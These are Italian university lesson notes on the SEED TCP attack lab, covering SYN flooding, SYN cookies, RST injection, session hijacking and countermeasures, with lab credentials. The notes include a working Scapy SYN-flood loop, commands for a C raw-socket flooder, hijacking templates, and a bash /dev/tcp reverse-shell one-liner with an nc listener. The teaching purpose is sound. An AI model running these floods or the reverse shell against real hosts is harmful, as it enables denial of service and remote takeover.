## **Lezione 5: Attacchi TCP in laboratorio: SYN flood, RST e hijacking**

### **1. Obiettivi del laboratorio SEED TCP/IP Attack**

Il laboratorio SEED `TCP_Attacks2.pdf` ha l'obiettivo di far sperimentare vulnerabilità storiche e strutturali di TCP:

- SYN flooding e SYN cookies;
- TCP reset attack;
- TCP session hijacking;
- reverse shell ottenuta tramite session hijacking.

Il laboratorio usa container Docker su rete `10.9.0.0/24` e sessioni Telnet tra host. Telnet è volutamente insicuro: trasmette in chiaro e non protegge il flusso con autenticazione crittografica.

> 📌 Telnet è usato perché è fragile e didatticamente trasparente. In un sistema reale si usa SSH proprio per evitare sniffing e hijacking del contenuto applicativo.

### **2. Topologia**

Nel Labsetup `tcpattack`:

- `seed-attacker`: attaccante in modalità host network;
- `victim-10.9.0.5`: vittima/server Telnet;
- `user1-10.9.0.6`: utente legittimo;
- `user2-10.9.0.7`: secondo utente.

La vittima avvia `openbsd-inetd`, che espone servizi come Telnet. L'account presente nei container è:

- utente: `seed`;
- password: `dees`.

<!-- INSERT INSTRUCTOR SLIDE/DIAGRAM HERE -->

### **3. SYN flooding**

Un SYN flood è un Denial of Service contro l'apertura TCP:

1. l'attaccante invia molti SYN alla porta della vittima;
2. la vittima risponde con SYN/ACK;
3. l'ACK finale non arriva;
4. la vittima mantiene stato per connessioni half-open;
5. la coda si riempie e nuove connessioni legittime falliscono.

Stato osservabile:

- `SYN-RECV`: handshake iniziato ma non completato;
- `ESTABLISHED`: handshake completato.

Comandi per osservare parametri:

```bash
sysctl net.ipv4.tcp_max_syn_backlog
netstat -nat
ss -ant
```

> 📌 Il bersaglio dell'attacco non è "la banda" in astratto, ma la memoria/stato della backlog per connessioni TCP incomplete.

### **4. SYN cookies**

Ubuntu abilita normalmente una mitigazione chiamata SYN cookies. L'idea: quando il server sospetta un flood, evita di allocare stato completo per ogni SYN. Codifica invece informazioni nel sequence number del SYN/ACK e alloca lo stato solo se arriva l'ACK finale valido.

Nel container vittima il Labsetup disabilita questa difesa:

```yaml
sysctls:
  - net.ipv4.tcp_syncookies=0
```

Comandi:

```bash
sysctl -a | grep syncookies
sudo sysctl -w net.ipv4.tcp_syncookies=0
sudo sysctl -w net.ipv4.tcp_syncookies=1
```

> ⚠️ Per modificare `sysctl` dentro un container, il container deve essere privilegiato. Senza privilegi, il kernel può rispondere con filesystem read-only o permesso negato.

### **5. Task 1.1: SYN flood con Python/Scapy**

Il PDF fornisce lo scheletro di `synflood.py`: invia SYN spoofati con IP sorgente, porta sorgente e sequence number casuali.

Struttura:

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags="S")
pkt = ip / tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
```

Esecuzione dall'attaccante:

```bash
docksh seed-attacker
cd /volumes
python3 synflood.py
```

Test dalla macchina utente:

```bash
docksh user1-10.9.0.6
telnet 10.9.0.5
```

Il PDF avverte che l'attacco Python può fallire perché non genera pacchetti abbastanza velocemente. La connessione legittima compete con i SYN falsi per uno slot libero.

> 💡 Il laboratorio non è fallito se Python non basta: è un risultato atteso. Serve a mostrare il rapporto tra velocità dell'attaccante, dimensione della coda e difese del kernel.

### **6. Variabili che influenzano il SYN flood**

Il PDF indica più fattori:

- **velocità dell'attacco**: Python/Scapy è comodo ma non massimizza throughput;
- **dimensione della queue**: `net.ipv4.tcp_max_syn_backlog`;
- **SYN cookies**: se abilitate, riducono l'efficacia del flood;
- **cache/mitigazioni kernel**: Ubuntu può favorire client che hanno già completato connessioni precedenti;
- **NAT/VirtualBox**: in alcuni setup, pacchetti di ritorno verso IP spoofati possono generare RST o comportamenti che svuotano la coda.

Per ridurre la backlog:

```bash
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=80
```

Per monitorare:

```bash
ss -ant state syn-recv
netstat -nat | grep SYN_RECV
```

> ⚠️ Le osservazioni possono differire dal PDF originale perché il docente/SEED si riferisce a Ubuntu 20.04 e VirtualBox più vecchi. Nel nostro setup 2026 conta il comportamento reale osservato nella VM.

### **7. Task 1.2: SYN flood in C**

Il file `Labsetup-tcpattack.zip` contiene `volumes/synflood.c`. Il programma C costruisce pacchetti TCP SYN con raw socket:

- header IP;
- header TCP;
- pseudo-header per checksum TCP;
- IP sorgente casuale;
- porta sorgente casuale;
- sequence number casuale;
- flag `SYN`;
- destinazione e porta passate da riga di comando.

Compilazione:

```bash
cd ~/ssri-lab/m4-ud2-l8/tcpattack/Labsetup/volumes
gcc -o synflood synflood.c
```

Esecuzione dall'attaccante:

```bash
docksh seed-attacker
cd /volumes
./synflood 10.9.0.5 23
```

Su Apple Silicon/ARM il PDF indica compilazione statica:

```bash
gcc -static -o synflood synflood.c
```

Nel nostro ambiente amd64 non dovrebbe servire.

> 📌 La differenza attesa è che il C invia pacchetti molto più velocemente di Python/Scapy, quindi può saturare la coda con maggiore probabilità.

### **8. Task 1.3: riabilitare SYN cookies**

Dopo aver osservato l'attacco con SYN cookies disabilitate, il laboratorio chiede di abilitarle e riprovare:

```bash
docksh victim-10.9.0.5
sysctl -w net.ipv4.tcp_syncookies=1
```

Poi si ripete l'attacco e si confronta:

- possibilità di aprire Telnet durante l'attacco;
- numero di stati `SYN-RECV`;
- differenza tra attacco Python e C;
- comportamento della vittima con backlog sotto pressione.

> ✅ Punto d'esame: SYN cookies trasformano l'allocazione di stato da immediata a differita, quindi riducono la vulnerabilità strutturale del three-way handshake.

### **9. TCP RST attack su Telnet**

Il TCP reset attack termina una connessione esistente inviando un segmento con flag `RST` e parametri coerenti con la sessione.

Per riuscire servono:

- IP sorgente e destinazione corretti;
- porte sorgente e destinazione corrette;
- sequence number accettabile;
- visibilità sul traffico o capacità di stimare i numeri TCP.

Scheletro Scapy:

```python
#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="R", seq=@@@@)
pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)
```

I valori `@@@@` si ricavano da Wireshark osservando la sessione Telnet.

> 📌 Per resettare la connessione vista dal destinatario, il `SEQ` deve essere nel punto che quel destinatario si aspetta o dentro la finestra accettabile.

### **10. TCP session hijacking**

Nel session hijacking l'attaccante non chiude la connessione: inietta dati dentro una sessione già autenticata. Se la sessione è Telnet, i dati iniettati sono interpretati come comandi digitati dall'utente legittimo.

Scheletro:

```python
#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="A", seq=@@@@, ack=@@@@)
data = "@@@@"
pkt = ip / tcp / data
ls(pkt)
send(pkt, verbose=0)
```

Campi da ricavare:

- `src`: IP del client da impersonare;
- `dst`: IP del server Telnet;
- `sport`: porta effimera del client;
- `dport`: porta Telnet, tipicamente `23`;
- `seq`: prossimo byte atteso dal server dal lato client;
- `ack`: acknowledgement coerente verso il server;
- `data`: comando da iniettare.

> ⚠️ Dopo l'iniezione, la sessione può desincronizzarsi e produrre ACK storm. Per questo il laboratorio spinge verso una reverse shell: un solo comando apre un canale separato controllabile.

### **11. Reverse shell tramite hijacking**

Sull'attaccante:

```bash
nc -lnv 9090
```

Comando da iniettare nella sessione Telnet verso la vittima:

```bash
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

Significato:

- la Bash gira sulla vittima `10.9.0.5`;
- stdout va verso la connessione TCP con l'attaccante `10.9.0.1:9090`;
- stdin arriva dalla stessa connessione;
- stderr è rediretto nello stesso canale.

Quando il comando viene eseguito, Netcat sull'attaccante mostra una connessione ricevuta dalla vittima.

<!-- INSERT INSTRUCTOR SLIDE/DIAGRAM HERE -->

> 📌 L'hijacking serve solo a eseguire il bootstrap: la persistenza operativa passa poi sulla reverse shell.

### **12. Automazione con sniff-and-spoof**

Il PDF segnala come task opzionale l'automazione degli attacchi RST/hijacking con tecnica sniff-and-spoof:

1. sniffare la sessione Telnet;
2. estrarre IP, porte, sequence number, acknowledgement;
3. costruire il pacchetto RST o PSH/ACK;
4. inviarlo immediatamente.

Questo evita di copiare manualmente i valori da Wireshark, ma richiede più precisione nel codice.

> 💡 Manuale = capisci i campi. Automatico = dimostri di saperli estrarre al volo.

### **13. Contromisure da collegare alla teoria**

Questi laboratori confermano le difese studiate nelle lezioni teoriche:

- SYN cookies e backlog tuning contro SYN flood;
- filtering anti-spoofing in ingresso/uscita;
- switch hardening e difese anti-sniffing in LAN;
- SSH/TLS/IPsec invece di Telnet;
- sequence number robusti;
- validazione più severa dei RST;
- IDS/IPS per pattern anomali.

> ✅ Sintesi finale: TCP classico offre affidabilità, non autenticazione crittografica dei segmenti. Se l'attaccante può osservare o predire lo stato della connessione, può tentare reset o hijacking; se può saturare stati half-open, può tentare SYN flood. La difesa moderna combina hardening dello stack, filtraggio di rete e protocolli applicativi cifrati/autenticati.

